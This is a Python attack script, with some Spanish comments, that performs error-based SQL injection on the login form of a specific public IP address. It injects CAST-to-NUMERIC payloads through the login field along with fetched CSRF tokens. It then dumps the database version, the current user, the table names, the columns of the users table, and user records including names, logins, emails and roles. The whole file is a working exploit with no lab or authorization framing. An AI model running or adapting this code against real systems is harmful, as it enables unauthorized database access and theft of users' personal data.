#!/usr/bin/env python3
import requests
import re
import sys

URL = "http://37.60.230.11/login"
session = requests.Session()

Q = "qxxkq"  # delimiter start
Q2 = "qqpbq" # delimiter end
DELIM = f"(CHR(113)||CHR(120)||CHR(120)||CHR(107)||CHR(113))||"  # qxxkq
DELIM2 = f"||(CHR(113)||CHR(113)||CHR(112)||CHR(98)||CHR(113))"   # qqpbq

def get_csrf():
    r = session.get(URL)
    match = re.search(r'_token" value="([^"]+)"', r.text)
    return match.group(1) if match else ""

def error_extract(sql_expr):
    """
    Uses PostgreSQL error-based injection:
    CAST(delim || data || delim AS NUMERIC) -> error reveals data
    Returns the extracted string or None.
    """
    token = get_csrf()
    payload = f"admin' AND 1=CAST({DELIM}({sql_expr})::text{DELIM2} AS NUMERIC)-- -"
    r = session.post(URL, data={
        "login": payload,
        "password": "test",
        "_token": token
    }, allow_redirects=False)
    
    # Look for delimiter in the response (error message)
    if Q in r.text:
        start = r.text.index(Q) + len(Q)
        end = r.text.index(Q2, start)
        return r.text[start:end]
    elif r.status_code == 302:
        return "(TRUE - no error)"
    return None

def try_extract(sql_expr):
    result = error_extract(sql_expr)
    if result:
        print(f"  [+] {result}")
    else:
        print(f"  [!] No data extracted, trying blind...")
    return result

# --- TESTS ---
print("[*] Test error-based injection:")
r = error_extract("SELECT version()")
if r:
    print(f"  [+] Version: {r}")
else:
    print("  [!] Error-based no funciona, intentando blind")

print("\n[*] Current user:")
try_extract("SELECT current_user")

print("\n[*] Current database:")
try_extract("SELECT current_database()")

print("\n[*] Listando tablas:")
for i in range(5):
    sql = f"SELECT table_name FROM information_schema.tables WHERE table_catalog='plazamoyobanba' AND table_schema='public' ORDER BY table_name LIMIT 1 OFFSET {i}"
    result = error_extract(sql)
    if result:
        print(f"  [+] Tabla {i+1}: {result}")
    else:
        print(f"  [!] No hay mas tablas (offset {i})")
        break

print("\n[*] Columnas de users:")
for i in range(15):
    sql = f"SELECT column_name FROM information_schema.columns WHERE table_catalog='plazamoyobanba' AND table_schema='public' AND table_name='users' ORDER BY ordinal_position LIMIT 1 OFFSET {i}"
    result = error_extract(sql)
    if result:
        print(f"  [+] Columna {i+1}: {result}")
    else:
        break

print("\n[*] Datos de users:")
for row in range(5):
    sql = f"SELECT CONCAT_WS('|', id, name, login, email, role_name) FROM users LIMIT 1 OFFSET {row}"
    result = error_extract(sql)
    if result:
        print(f"  [+] Fila {row+1}: {result}")
    else:
        print(f"  [!] No hay mas filas")
        break
